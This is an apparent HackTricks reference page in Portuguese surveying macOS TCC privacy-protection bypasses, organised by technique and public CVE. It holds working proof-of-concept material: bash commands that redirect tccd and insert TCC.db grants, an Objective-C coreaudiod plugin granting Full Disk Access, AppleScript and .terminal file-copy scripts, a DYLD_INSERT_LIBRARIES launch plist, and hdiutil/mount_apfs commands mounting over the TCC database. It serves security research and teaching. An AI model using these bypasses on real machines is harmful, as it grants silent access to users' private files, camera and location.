# Bypasses do macOS TCC

{{#include ../../../../../banners/hacktricks-training.md}}

## Por funcionalidade

### Bypass de escrita

Isso não é um bypass, é apenas como o TCC funciona: **ele não oferece proteção contra escrita**. Se o Terminal **não tiver acesso para ler a Área de Trabalho de um usuário, ele ainda poderá gravar nela**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
O **extended attribute `com.apple.macl`** é adicionado ao novo **file** para dar ao **creators app** acesso para lê-lo.

### TCC ClickJacking

É possível **colocar uma janela sobre o prompt do TCC** para fazer o usuário **aceitá-lo** sem perceber. Você pode encontrar um PoC em [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

O atacante pode **criar apps com qualquer nome** (por exemplo, Finder, Google Chrome...) no **`Info.plist`** e fazer com que solicitem acesso a algum local protegido pelo TCC. O usuário pensará que o aplicativo legítimo é o que está solicitando esse acesso.\
Além disso, é possível **remover o app legítimo do Dock e colocar o falso nele**. Assim, quando o usuário clicar no falso (que pode usar o mesmo ícone), ele poderá chamar o legítimo, solicitar permissões do TCC e executar um malware, fazendo o usuário acreditar que o app legítimo solicitou o acesso.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Mais informações e PoC em:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Por padrão, um acesso via **SSH costumava ter "Full Disk Access"**. Para desativá-lo, é necessário que ele esteja listado, mas desativado (removê-lo da lista não removerá esses privilégios):<sup>[2]</sup>

![TCC Request by arbitrary name - SSH Bypass: Por padrão, um acesso via SSH costumava ter "Full Disk Access". Para desativá-lo, é necessário que ele esteja listado, mas desativado (removê-lo...](<../../../../../images/image (1077).png>)

Aqui você encontra exemplos de como alguns **malwares conseguiram contornar essa proteção**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[11]</sup>

> [!CAUTION]
> Observe que agora, para poder habilitar o SSH, é necessário ter **Full Disk Access**

### Handle extensions - CVE-2022-26767

O atributo **`com.apple.macl`** é atribuído a arquivos para dar a um **determinado aplicativo permissões para lê-los.** Esse atributo é definido quando um arquivo é **arrastado e solto** sobre um app ou quando um usuário **clica duas vezes** em um arquivo para abri-lo com o **aplicativo padrão**.

Portanto, um usuário poderia **registrar um app malicioso** para lidar com todas as extensões e chamar o Launch Services para **abrir** qualquer arquivo (assim, o arquivo malicioso receberá acesso para lê-lo).

### iCloud

Por meio do entitlement **`com.apple.private.icloud-account-access`**, é possível se comunicar com o **`com.apple.iCloudHelper`** XPC service, que **fornecerá tokens do iCloud**.

O **iMovie** e o **Garageband** tinham esse entitlement e outros que permitiam isso.

Para obter mais **informações** sobre o exploit para **obter tokens do iCloud** por meio desse entitlement, consulte a palestra: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[12]</sup>

### kTCCServiceAppleEvents / Automation

Um app com a permissão **`kTCCServiceAppleEvents`** poderá **controlar outros Apps**. Isso significa que ele poderá **abusar das permissões concedidas aos outros Apps**.

Para obter mais informações sobre Apple Scripts, consulte:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Por exemplo, se um App tiver **permissão de Automation sobre o `iTerm`**, como neste exemplo, o **`Terminal`** terá acesso ao iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

O Terminal, que não tem FDA, pode chamar o iTerm, que tem essa permissão, e usá-lo para executar ações:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Por meio do Finder

Ou, se um App tiver acesso ao Finder, ele poderia executar um script como este:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Por comportamento do App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

O **tccd daemon** em **userland** usava a variável **`HOME`** do **env** para acessar o banco de dados de usuários do TCC em: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

De acordo com [esta publicação no Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), e como o TCC daemon é executado pelo `launchd` dentro do domínio do usuário atual, é possível **controlar todas as variáveis de ambiente** passadas para ele.\
Assim, um **attacker poderia definir a variável de ambiente `$HOME`** no **`launchctl`** para apontar para um **diretório** **controlado**, **reiniciar** o daemon do **TCC** e, então, **modificar diretamente o banco de dados do TCC** para conceder a si mesmo **todos os TCC entitlements disponíveis**, sem que o usuário final recebesse qualquer prompt.<sup>[1]</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notas

Notes tinha acesso a locais protegidos pelo TCC, mas quando uma nota é criada, ela é **criada em um local não protegido**. Portanto, era possível solicitar ao Notes que copiasse um arquivo protegido para uma nota (ou seja, para um local não protegido) e, em seguida, acessar o arquivo:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

O binário `/usr/libexec/lsd`, com a biblioteca `libsecurity_translocate`, tinha o entitlement `com.apple.private.nullfs_allow`, que permitia criar um mount **nullfs**, e tinha o entitlement `com.apple.private.tcc.allow` com **`kTCCServiceSystemPolicyAllFiles`** para acessar qualquer arquivo.

Era possível adicionar o atributo de quarentena a "Library", chamar o serviço XPC **`com.apple.security.translocation`** e, então, ele mapearia Library para **`$TMPDIR/AppTranslocation/d/d/Library`**, onde todos os documentos dentro de Library poderiam ser **acessados**.

### CVE-2024-44131 - FileProvider symlink race

Apps que delegam operações de arquivo a um **privileged helper** (neste caso, **`fileproviderd`** / **`Files.app`**) copiam ou movem itens **em nome do usuário**, portanto a cópia é executada com os privilégios do helper, em vez dos privilégios do caller.

A Jamf Threat Labs mostrou que a validação do symlink realizada antes da operação pode sofrer uma **race condition**: em vez de inserir o symlink no **último** componente do caminho (que é verificado), o atacante troca um diretório **intermediário** do caminho **depois que a cópia já começou**. O privileged helper então segue o link controlado pelo atacante e lê/grava em locais protegidos pelo TCC **sem jamais exibir um prompt**.<sup>[7]</sup>

Diretórios que **não** são protegidos por um UUID aleatório em seu caminho (por exemplo, `~/Library/Mobile Documents/com~apple~CloudDocs`) são os alvos mais fáceis, pois o atacante pode prever o caminho completo para realizar a race.

> [!TIP]
> Este é o padrão genérico a ser procurado: **qualquer processo privilegiado que resolva um caminho mais de uma vez** (check-then-use ou `rename()`/`copyfile()` resolvendo a origem e o destino separadamente) pode sofrer uma race condition caso um diretório no meio do caminho seja trocado. Apenas `O_NOFOLLOW_ANY`, `openat()` em um diretório FD já aberto ou `realpath()` + revalidação realmente fecham essa janela.

Mais informações no [**writeup da Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[7]</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` pode ser compilada com `SQLITE_ENABLE_SQLLOG`, que adiciona um logging hook controlado por environment variables ([`test_sqllog.c` upstream](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[8]</sup>

- **`SQLITE_SQLLOG_DIR=path`** – para **cada database aberto**, uma **cópia do arquivo do database** e um log das instruções SQL são gravados em `path` (o diretório já deve existir).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – obtém uma **nova cópia sempre que** um DB é aberto/anexado, em vez de reutilizar uma.
- **`SQLITE_SQLLOG_CONDITIONAL`** – registra uma conexão somente se existir um arquivo `<database>-sqllog` ao lado do DB principal.

Se você puder injetar essa variável em um processo que tenha **FDA** e abra databases SQLite, ele irá **copiar os databases protegidos** para um diretório sob seu controle. Como o nome do arquivo de destino é derivado de dados controlados pelo atacante, um **symlink inserido no destino** transforma a mesma primitive em uma **arbitrary file write** com os privilégios do processo-alvo.

### **SQLITE_AUTO_TRACE**

Se a environment variable **`SQLITE_AUTO_TRACE`** estiver definida, a biblioteca **`libsqlite3.dylib`** começará a **registrar** todas as queries SQL. Muitos aplicativos usavam essa biblioteca, portanto era possível registrar todas as suas queries SQLite.

Vários aplicativos da Apple usavam essa biblioteca para acessar informações protegidas pelo TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Procurando por gravações de arquivos orientadas por env-var

As duas entradas anteriores são exemplos da mesma técnica genérica, e vale a pena procurar por mais casos: **frameworks carregados em apps privilegiados pelo TCC frequentemente expõem variáveis de ambiente de debug/logging que fazem o processo criar um arquivo em um caminho controlado pelo chamador**.

Fluxo de trabalho para encontrá-las:

1. Escolha um alvo com FDA ou outra permissão TCC interessante (`Music`, `TV`, `Terminal`, agentes MDM...) e liste os frameworks aos quais ele está vinculado (`otool -L`, `vmmap`).
2. Procure nesses frameworks por strings usadas com `getenv`: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Defina as variáveis candidatas via `launchctl setenv NAME /path/you/control`, inicie o app e observe o que ele faz no sistema de arquivos com `fs_usage -w -f filesys <pid>` ou `sudo fs_usage | grep <path>`.
4. Se o processo **criar ou renomear** um arquivo no seu diretório, você terá uma primitiva de escrita: aponte o destino para um symlink (ou faça uma race em um diretório intermediário, como no CVE-2024-44131 acima) para redirecioná-lo para `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Duas coisas limitam isso. Primeiro, as variáveis **`DYLD_*`** são ignoradas por binários com hardened runtime, a menos que o app inclua a entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("um valor Booleano que indica se o app pode ser afetado por variáveis de ambiente do dynamic linker, que você pode usar para injetar código no processo do seu app") — veja também [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Segundo, a Apple remove variáveis individuais de debug dos frameworks assim que elas são reportadas, portanto, uma variável que funcionava em uma versão do macOS frequentemente desaparece na seguinte. Se um app se recusar silenciosamente a iniciar depois que você definir uma variável, considere que ela já foi filtrada.

Veja [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) para o truque equivalente com variáveis do linker.

### Apple Remote Desktop

Como root, você poderia habilitar esse serviço, e o **agente ARD teria full disk access**, que poderia então ser abusado por um usuário para fazê-lo copiar um novo **banco de dados TCC do usuário**.

## Por **NFSHomeDirectory**

O TCC usa um banco de dados na pasta HOME do usuário para controlar o acesso a recursos específicos do usuário em **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Portanto, se o usuário conseguir reiniciar o TCC com uma variável de ambiente $HOME apontando para uma **pasta diferente**, poderá criar um novo banco de dados TCC em **/Library/Application Support/com.apple.TCC/TCC.db** e induzir o TCC a conceder qualquer permissão TCC a qualquer app.

> [!TIP]
> Observe que a Apple usa a configuração armazenada no perfil do usuário, no atributo **`NFSHomeDirectory`**, como o **valor de `$HOME`**. Portanto, se você comprometer um aplicativo com permissões para modificar esse valor (**`kTCCServiceSystemPolicySysAdminFiles`**), poderá **weaponize** essa opção com um TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

A **primeira POC** usa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) e [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) para modificar a pasta **HOME** do usuário.

1. Obtenha um blob _csreq_ para o app-alvo.
2. Plante um arquivo _TCC.db_ falso com o acesso necessário e o blob _csreq_.
3. Exporte a entrada do usuário no Directory Services com [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modifique a entrada do Directory Services para alterar o diretório home do usuário.
5. Importe a entrada modificada do Directory Services com [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Pare o _tccd_ do usuário e reinicie o processo.

A segunda POC usava **`/usr/libexec/configd`**, que possuía `com.apple.private.tcc.allow` com o valor `kTCCServiceSystemPolicySysAdminFiles`.\
Era possível executar o **`configd`** com a opção **`-t`**, permitindo que um atacante especificasse um **Bundle personalizado para carregar**. Portanto, o exploit **substitui** o método **`dsexport`** e **`dsimport`** de alteração do diretório home do usuário por uma **injeção de código no `configd`**.

Para mais informações, consulte o [**relatório original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[13]</sup>

## Por injeção de processo

Existem diferentes técnicas para injetar código dentro de um processo e abusar de seus privilégios TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Além disso, a injeção de processo mais comum encontrada para bypass do TCC ocorre por meio de **plugins (load library)**.\
Plugins são códigos adicionais, geralmente na forma de bibliotecas ou plist, que serão **carregados pelo aplicativo principal** e executados em seu contexto. Portanto, se o aplicativo principal tivesse acesso a arquivos restritos pelo TCC (por meio de permissões concedidas ou entitlements), o **código personalizado também teria esse acesso**.

### CVE-2020-27937 - Directory Utility

O aplicativo `/System/Library/CoreServices/Applications/Directory Utility.app` possuía a entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, carregava plugins com a extensão **`.daplug`** e **não tinha o** hardened runtime.

Para weaponize este CVE, o **`NFSHomeDirectory`** é **alterado** (abusando da entitlement anterior) para que seja possível **assumir o controle do banco de dados TCC dos usuários** e realizar um TCC bypass.

Para mais informações, consulte o [**relatório original**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[14]</sup>

### CVE-2020-29621 - Coreaudiod

O binário **`/usr/sbin/coreaudiod`** possuía as entitlements `com.apple.security.cs.disable-library-validation` e `com.apple.private.tcc.manager`. A primeira **permitia injeção de código**, e a segunda lhe dava acesso para **gerenciar o TCC**.

Esse binário permitia carregar **plug-ins de terceiros** a partir da pasta `/Library/Audio/Plug-Ins/HAL`. Portanto, era possível **carregar um plugin e abusar das permissões TCC** com esta POC:<sup>[15]</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Para mais informações, consulte o [**relatório original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[15]</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Aplicativos do sistema que abrem o stream da câmera via Core Media I/O (aplicativos com **`kTCCServiceCamera`**) carregam no processo estes plugins localizados em `/Library/CoreMediaIO/Plug-Ins/DAL` (não restrito pelo SIP).

Basta armazenar ali uma biblioteca com o **constructor** comum para **injetar código**.

Vários aplicativos da Apple eram vulneráveis a isso.

### Firefox

O aplicativo Firefox tinha os entitlements `com.apple.security.cs.disable-library-validation` e `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[16]</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Para mais informações sobre como explorá-lo facilmente, [**consulte o relatório original**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[16]</sup>

### CVE-2020-10006

O binário `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` tinha os entitlements **`com.apple.private.tcc.allow`** e **`com.apple.security.get-task-allow`**, o que permitia injetar código no processo e usar os privilégios do TCC.

### CVE-2023-26818 - Telegram

O Telegram tinha os entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** e **`com.apple.security.cs.disable-library-validation`**, portanto era possível abusar dele para **obter acesso às suas permissões**, como gravar usando a câmera. Você pode [**encontrar o payload no writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[17]</sup>

Observe como, para usar a variável de ambiente e carregar uma library, um **plist personalizado** foi criado para injetar essa library, e o **`launchctl`** foi usado para iniciá-la:<sup>[17]</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Por invocações de open

É possível invocar **`open`** mesmo durante o sandboxing

### Scripts do Terminal

É bastante comum conceder **Full Disk Access (FDA)** ao Terminal, pelo menos em computadores usados por profissionais de tecnologia. E é possível invocar scripts **`.terminal`** com ele.

Scripts **`.terminal`** são arquivos plist como este, com o comando a ser executado na chave **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Um aplicativo poderia escrever um script de terminal em um local como /tmp e executá-lo com um comando como:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Por montagem

### CVE-2020-9771 - mount_apfs TCC bypass e privilege escalation

**Qualquer usuário** (mesmo os sem privilégios) pode criar e montar um snapshot do Time Machine e **acessar TODOS os arquivos** desse snapshot.\
O **único privilégio** necessário é que o aplicativo usado (como o `Terminal`) tenha acesso ao **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), que precisa ser concedido por um administrador.<sup>[2]</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Uma explicação mais detalhada pode ser [**encontrada no relatório original**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 e CVE-2021-30808 - Mount over TCC file

Mesmo que o arquivo TCC DB esteja protegido, era possível **montar sobre o diretório** um novo arquivo TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Confira o **exploit completo** no [**writeup original**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Conforme explicado no [writeup original](https://www.kandji.io/blog/macos-audit-story-part2), este CVE explorava o `diskarbitrationd`.<sup>[18]</sup>

A função `DADiskMountWithArgumentsCommon` do framework público `DiskArbitration` realizava as verificações de segurança. No entanto, era possível contorná-las chamando diretamente o `diskarbitrationd` e, consequentemente, usando elementos `../` no caminho e symlinks.

Isso permitia que um atacante realizasse mounts arbitrários em qualquer local, inclusive sobre o banco de dados do TCC, devido ao entitlement `com.apple.private.security.storage-exempt.heritable` do `diskarbitrationd`.

### asr

A ferramenta **`/usr/sbin/asr`** permitia copiar o disco inteiro e montá-lo em outro local, contornando as proteções do TCC.

### CVE-2022-22655 - Serviços de Localização

Os Serviços de Localização **não** são armazenados em um banco de dados do TCC como os demais serviços. Eles são gerenciados pelo `locationd`, que mantém sua própria lista de permissões em **`/var/db/locationd/clients.plist`**:<sup>[5]</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Cada entrada é identificada pelo cliente (bundle ID ou caminho do executável) e contém campos como `Authorized`, `BundleId`, `Executable` e `Registered`.

O próprio arquivo `clients.plist` é protegido pelo Sandbox/TCC e não pode ser editado nem mesmo como root — mas o diretório **`/var/db/locationd/` não era protegido contra montagem**. Assim, um atacante executando como root poderia criar uma imagem de disco contendo seu próprio `clients.plist` (com o binário marcado como `Authorized`), montá-la sobre o diretório e reiniciar o `locationd` para que a allow-list forjada entrasse em vigor.<sup>[5]</sup>

> [!TIP]
> Este é o mesmo padrão dos TCC bypasses com `hdiutil`/`mount` acima: o *arquivo* é protegido, mas o *diretório onde ele está* não é; portanto, você substitui o diretório inteiro em vez do arquivo.

## Por aplicativos de inicialização


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Por grep

Em várias ocasiões, arquivos armazenarão informações sensíveis, como e-mails, números de telefone, mensagens... em locais não protegidos (o que é considerado uma vulnerabilidade pela Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Isso não funciona mais, mas [**funcionava no passado**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Outra forma usando [**eventos CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[19]</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Referências

- [1] [CVE-2020–9934: Bypassing o macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Contornando as proteções de privacidade do usuário do macOS TCC por acidente e por design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [Mais de 20 maneiras de contornar seus mecanismos de privacidade do macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [4] [Vitória por nocaute contra o TCC - mais de 20 novas maneiras de contornar seus mecanismos de privacidade do MacOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [5] [CVE-2022-22655 - TCC Location Services bypass (relatório original)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [6] [Onde no mundo está Carmen Sandiego: abusando do Location Services no macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [7] [Jamf Threat Labs - CVE-2024-44131: TCC bypass rouba dados do iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [8] [SQLite - `test_sqllog.c` (variáveis de ambiente SQLITE_ENABLE_SQLLOG)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [9] [Apple - entitlement Allow DYLD environment variables](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [10] [The Eclectic Light Company - Notarization: o hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [11] [Zero-Day TCC bypass descoberto no malware XCSSET](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [12] [OBTS v5.0: "O que acontece no seu Mac fica no iCloud da Apple?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [13] [Nova vulnerabilidade do macOS, "powerdir", pode permitir acesso não autorizado a dados do usuário](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [14] [Alterar o diretório home e contornar o TCC, também conhecido como CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [15] [Reproduzir a música e contornar o TCC, também conhecido como CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [16] [Como roubar uma (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [17] [CVE-2023-26818 - Contornando o TCC com o Telegram no macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [18] [Kandji - Descobrindo vulnerabilidades da Apple: auditoria do diskarbitrationd e storagekitd - Parte 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [19] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks e CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)

{{#include ../../../../../banners/hacktricks-training.md}}
